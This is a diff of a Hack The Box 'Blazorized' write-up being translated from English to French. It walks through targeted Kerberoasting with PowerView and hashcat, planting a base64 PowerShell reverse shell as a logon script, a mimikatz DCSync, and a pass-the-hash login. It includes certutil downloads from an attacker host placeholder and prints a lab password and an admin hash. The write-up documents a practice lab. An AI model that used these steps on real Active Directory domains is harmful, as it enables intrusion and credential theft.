 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/sharhound_zip.png" alt="SharpHound zip file"></p>
-<p>We download the <code>zip</code> archive on our local machine, extract it, and load the files in Bloodhound.</p>
-<p>Find user <code>NU_1055</code>, then go to <code>Node Info</code> &ndash;&gt; <code>First Degree Object Control</code> under <code>OUTBOUND OBJECT CONTROL</code>. We discover that the user has the <code>WriteSPN</code> right over the user <code>RSA_4810</code>.</p>
+<p>Nous téléchargeons l&rsquo;archive <code>zip</code> sur notre machine locale, l&rsquo;extrayons et téléchargeons les fichiers dans Bloodhound.</p>
+<p>Nous trouvons l&rsquo;utilisateur <code>NU_1055</code>, puis nous allons dans <code>Node Info</code> &ndash;&gt; <code>First Degree Object Control</code> sous <code>OUTBOUND OBJECT CONTROL</code>. Nous découvrons que l&rsquo;utilisateur a le droit <code>WriteSPN</code> sur l&rsquo;utilisateur <code>RSA_4810</code>.</p>
 <blockquote>
-<p>SPNs are identifiers used by Kerberos to associate a service with a particular account in Active Directory. When a client requests access to a service (identified by its SPN), it requests a Service Ticket for that service from the Domain Controller. For our Kerberoast attack, we will request a Service Ticket for the specific SPN we will create. Since Service Tickets are encrypted with the NTLM hash of the service account’s password, after obtaining these tickets, we can try to crack the hash offline in order recover the service account password.</p>
+<p>Les SPN sont des identifiants utilisés par Kerberos pour associer un service à un compte particulier au sein de l&rsquo;Active Directory. Lorsqu&rsquo;un client demande l&rsquo;accès à un service (identifié par son SPN), il demande au contrôleur de domaine un ticket de service pour ce service. Pour notre attaque Kerberoast, nous demanderons un ticket de service pour le SPN spécifique que nous allons créer. Comme les tickets de service sont chiffrés avec le hachage NTLM du mot de passe du compte de service, après avoir obtenu ces tickets, nous pouvons essayer de craquer le hachage hors ligne afin de récupérer le mot de passe du compte de service.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/WriteSPN_Abuse.png" alt="WriteSPN abuse"></p>
 <ol>
-<li>Transfer <code>PowerView.ps1</code> to the target.</li>
+<li>Transférez <code>PowerView.ps1</code> sur la cible.</li>
 </ol>
 <pre tabindex="0"><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/PowerView.ps1 powerview.ps1
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/powerview_transfer.png" alt="PowerView file transfer"></p>
 <ul>
-<li>Switch to a PowerShell prompt and import the PowerView module with the command below</li>
+<li>Passez à un prompt PowerShell et importez le module PowerView à l&rsquo;aide de la commande suivante</li>
 </ul>
 <pre tabindex="0"><code>Import-Module ./powerview.ps1
 </code></pre><ol start="2">
-<li>Add an arbitrary SPN to user <code>RSA_4810</code> account.</li>
+<li>Ajoutez un SPN arbitraire au compte de l&rsquo;utilisateur <code>RSA_4810</code>.</li>
 </ol>
 <pre tabindex="0"><code>Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname=&#39;darryl/kscorpio&#39;}
 </code></pre><ol start="3">
-<li>Request a Kerberos Ticket, receive the password hash of <code>RSA_4810</code> and crack it offline.</li>
+<li>Sollicitez un ticket Kerberos, recevez le hachage du mot de passe <code>RSA_4810</code> et craquez-le.</li>
 </ol>
 <pre tabindex="0"><code>Get-DomainSPNTicket -SPN darryl/kscorpio 
 </code></pre><blockquote>
-<p>You will need to do some formatting when you copy the hash because it is full of whitespaces.</p>
+<p>Vous devez supprimer tous les espaces blancs du hachage afin de l&rsquo;utiliser.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/targeted_kerberoasting.png" alt="Targeted kerberoast attack"></p>
-<p>Using hashcat we crack the hash and recover the password <code>(Ni7856Do9854Ki05Ng0005 #)</code>.</p>
+<p>Avec hashcat, nous récupérons le mot de passe <code>(Ni7856Do9854Ki05Ng0005 #)</code>.</p>
 <pre tabindex="0"><code>hashcat -m 13100 -a 0 RSA4810_hash.txt /usr/share/wordlists/rockyou.txt
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/RSA_4810_pwd.png" alt="RSA_4810 password"></p>
-<p>We can now login as <code>RSA_4810</code>.</p>
+<p>Nous nous connectons sous le nom de <code>RSA_4810</code>.</p>
 <pre tabindex="0"><code>evil-winrm -u RSA_4810 -p &#34;(Ni7856Do9854Ki05Ng0005 #)&#34; -i blazorized.htb
-</code></pre><p>This account does not seem to have anything interesting file-wise. Besides <code>Administrator</code> the only other user present in <code>C:\Users</code> is <code>SSA_6010</code>, so we probably need to move to this user.</p>
-<h3 id="lateral-movement-shell-as-ssa_6010">Lateral Movement (shell as SSA_6010)</h3>
-<p>Let&rsquo;s enumerate the ACLs in the domain involving permissions related to the user <code>RSA_4810</code>.</p>
+</code></pre><p>Ce compte ne semble pas avoir de fichiers intéressants. En plus de <code>Administrator</code>, le seul autre utilisateur présent dans <code>C:\Users</code> est <code>SSA_6010</code>, nous devons probablement changer d&rsquo;utilisateur.</p>
+<h3 id="mouvement-latéral-shell-en-tant-que-ssa_6010">Mouvement latéral (Shell en tant que SSA_6010)</h3>
+<p>Enumérons les ACLs du domaine impliquant des permissions liées à l&rsquo;utilisateur <code>RSA_4810</code>.</p>
 <pre tabindex="0"><code>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match &#34;rsa_4810&#34;}
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/write_scriptpath.png" alt="ACL script-path information"></p>
-<p>It turns out that <code>RSA_4810</code> has permission to modify the <code>Script-Path</code> property for <code>SSA_6010</code>. When I try to query the specific <code>scriptPath</code> for <code>SSA_6010</code> it comes back empty. This probably means that no logon script is currently set for the user.</p>
+<p>Il s&rsquo;avère que <code>RSA_4810</code> a la permission de modifier la propriété <code>Script-Path</code> de <code>SSA_6010</code>. Lorsque j&rsquo;essaie de rechercher le <code>scriptPath</code> spécifique de <code>SSA_6010</code>, le résultat est vide. Cela signifie probablement qu&rsquo;aucun script de connexion n&rsquo;est actuellement défini pour l&rsquo;utilisateur.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/scriptPath_query.png" alt="scriptPath query"></p>
-<p>The path to those scripts is usually relative to a network share designated for logon scripts such as the <code>SYSVOL</code> directory, it looks like we will need to manually find the directory and find which file we can write to. Its standard location is <code>C:\Windows\SYSVOL</code>.</p>
-<p>In <code>C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts</code> we discover that we have Full permissions on the directory <code>A32FF3AEAA23</code>.</p>
+<p>Le chemin vers ces scripts est généralement relatif à un partage de réseau désigné pour les scripts de connexion, comme le répertoire <code>SYSVOL</code>, il semble que nous devons manuellement localiser le répertoire et identifier le fichier que nous pouvons modifier. Son emplacement standard est <code>C:\Windows\SYSVOL</code>.</p>
+<p>Dans <code>C:\Windows\SYSVOL\sysvol\blazorized.htb\scripts</code> nous découvrons que nous avons les permissions <code>Full</code> sur le répertoire <code>A32FF3AEAA23</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/SYSVOL_dir_perm.png" alt="SYSVOL directory permissions"></p>
 <ol>
-<li>We set a logon script for the user <code>SSA_6010</code>.</li>
+<li>Nous définissons un script de connexion pour l&rsquo;utilisateur <code>SSA_6010</code>.</li>
 </ol>
 <pre tabindex="0"><code>Set-ADUser -Identity SSA_6010 -ScriptPath &#39;A32FF3AEAA23\revshell.bat&#39; 
 </code></pre><ol start="2">
-<li>We write a PowerShell reverse shell to <code>revshell.bat</code>, which will be automatically executed when <code>SSA_6010</code> logs in.</li>
+<li>Nous plaçons un reverse shell PowerShell dans <code>revshell.bat</code>, qui sera automatiquement exécuté lorsque <code>SSA_6010</code> se connectera.</li>
 </ol>
 <ul>
-<li>Get a PowerShell reverse shell on <a href="https://www.revshells.com/" target="_blank" >revshells.com</a>
+<li>Nous pouvons obtenir un reverse shell PowerShell (<code>PowerShell#3 (Base64)</code>) sur <a href="https://www.revshells.com/" target="_blank" >revshells.com</a>
 
-, use the <code>PowerShell#3 (Base64)</code>.</li>
+.</li>
 </ul>
 <pre tabindex="0"><code> echo &#34;powershell -e JAB...&#34; | Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\revshell.bat -Encoding ASCII 
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/logon_script_revshell.png" alt="Logon script revshell"></p>
-<p>On our listener we catch a shell as <code>SSA_6010</code>.</p>
+<p>Sur notre listener, nous obtenons un shell sous le nom de <code>SSA_6010</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/SSA_6010_shell.png" alt="SSA_6010 shell"></p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>We switch to a meterpreter shell, upload SharpHound to the target an run it a second time.</p>
-<p><code>SSA_6010</code> is part of the <code>Super_Support_Administrators</code> group.</p>
+<h2 id="elévation-de-privilèges">Elévation de Privilèges</h2>
+<p>Nous passons à un shell meterpreter, téléchargeons SharpHound sur la cible et l&rsquo;exécutons une seconde fois.</p>
+<p><code>SSA_6010</code> fait partie du groupe <code>Super_Support_Administrators</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/SSA_6010_group_membership.png" alt="SSA_6010 group memberships"></p>
-<p>The members of this group have the <code>DCSync</code> right on the Domain Controller. We can use this right to achieve a DCSync attack and get the administrator password hash.</p>
+<p>Les membres de ce groupe ont le droit <code>DCSync</code> sur le contrôleur de domaine. Nous pouvons utiliser ce droit pour réaliser une attaque DCSync et obtenir le hachage du mot de passe de l&rsquo;administrateur.</p>
 <blockquote>
-<p>DCSync right is a permission typically granted to Domain Controllers in an AD environment. It is used to replicate directory information, including account credentials, across the domain. When a server has this permission, it can perform directory synchronization operations to keep data consistent between different domain controllers. With this right we can pretend to be a Domain Controller by sending a <code>DRSGetNCChanges</code> request to the target Domain Controller and when the Domain Controller responds, it sends sensitive information back to us, including password hashes for the requested accounts.</p>
+<p>Le droit DCSync est une autorisation généralement accordée aux contrôleurs de domaine dans un environnement AD. Il est utilisé pour répliquer les informations de l&rsquo;annuaire, y compris les informations d&rsquo;identification des comptes, à travers le domaine. Lorsqu&rsquo;un serveur dispose de ce droit, il peut effectuer des opérations de synchronisation d&rsquo;annuaire pour maintenir la cohérence des données entre différents contrôleurs de domaine. Avec ce droit, nous pouvons prétendre être un contrôleur de domaine en envoyant une requête <code>DRSGetNCChanges</code> au contrôleur de domaine cible et quand celui-ci répond, il nous renvoie des informations sensibles, y compris les hachages de mots de passe pour les comptes demandés.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/DCSync_abuse.png" alt="DCSync Abuse"></p>
 <pre tabindex="0"><code>certutil.exe -urlcache -split -f http://YOUR-IP:WEBSERVER_PORT/mimikatz.exe mimikatz.exe
-</code></pre><p>Execute mimikatz with <code>.\mimikatz.exe</code> and to get the admin hash, run the following command.</p>
+</code></pre><p>Exécutez mimikatz avec <code>.\mimikatz.exe</code> et pour obtenir le hachage de l&rsquo;administrateur, exécutez la commande suivante.</p>
 <pre tabindex="0"><code>lsadump::dcsync /domain:blazorized.htb /user:administrator
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/admin-hash.png" alt="admin password hash"></p>
-<p>Now we login as <code>Administrator</code> with the hash, and read the root flag.</p>
+<p>Enfin, nous nous connectons en tant que l&rsquo;<code>Administrateur</code>avec le hash, et lisons le drapeau root.</p>
 <pre tabindex="0"><code> evil-winrm -i 10.10.11.22 -u Administrator -H &#34;f55ed1465179ba374ec1cad05b34a5f3&#34; 
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/root_flag.png" alt="Root flag"></p>
-<p>This was a great box, I learned a lot pawning it. Below are some references that were useful to me. Thank you for reading this article and I hope it was of any help to you.</p>
+<p>Vous trouverez ci-dessous quelques références qui m&rsquo;ont été utiles. Je vous remercie d&rsquo;avoir lu cet article et j&rsquo;espère qu&rsquo;il vous a été utile.</p>
 <ul>
 <li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync" target="_blank" >HackTricks - DCSync</a>
 
@@ -568,7 +561,7 @@ Value = YOUR_ENCODED_JWT
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
-        <span class="tag"><a href="https://scorpiosec.com/tags/hack-the-box/">Hack The Box</a></span>
+        <span class="tag"><a href="https://scorpiosec.com/fr/tags/hack-the-box/">Hack The Box</a></span>
         
     </p>
 
@@ -576,7 +569,7 @@ Value = YOUR_ENCODED_JWT
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
 
-        <span class="tag"><a href="https://scorpiosec.com/categories/writeups/">Writeups</a></span>
+        <span class="tag"><a href="https://scorpiosec.com/fr/categories/writeups/">Writeups</a></span>
         
     </p>
 
@@ -589,7 +582,7 @@ Value = YOUR_ENCODED_JWT
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        2399 Words
+        2331 Mots
       </p>
 
       <p>
@@ -611,7 +604,7 @@ Value = YOUR_ENCODED_JWT
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -619,7 +612,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -631,7 +624,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Blazorized&amp;caption=HTB%3a%20Blazorized&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Blazorized&amp;caption=HTB%3a%20Blazorized&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -640,7 +633,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Blazorized&amp;body=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Blazorized&amp;body=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -648,7 +641,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f&amp;media=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f;description=HTB%3a%20Blazorized" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f&amp;media=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f;description=HTB%3a%20Blazorized" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -656,7 +649,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f&amp;title=HTB%3a%20Blazorized&amp;summary=HTB%3a%20Blazorized&amp;source=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f&amp;title=HTB%3a%20Blazorized&amp;summary=HTB%3a%20Blazorized&amp;source=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -664,7 +657,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f&amp;resubmit=true&amp;title=HTB%3a%20Blazorized" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f&amp;resubmit=true&amp;title=HTB%3a%20Blazorized" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -672,7 +665,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f;title=HTB%3a%20Blazorized" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f;title=HTB%3a%20Blazorized" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -680,7 +673,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Blazorized%20https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Blazorized%20https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -688,7 +681,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f&amp;t=HTB%3a%20Blazorized" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f11%2fhtb-blazorized%2f&amp;t=HTB%3a%20Blazorized" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -696,7 +689,7 @@ Value = YOUR_ENCODED_JWT
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Blazorized&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f11%2fhtb-blazorized%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
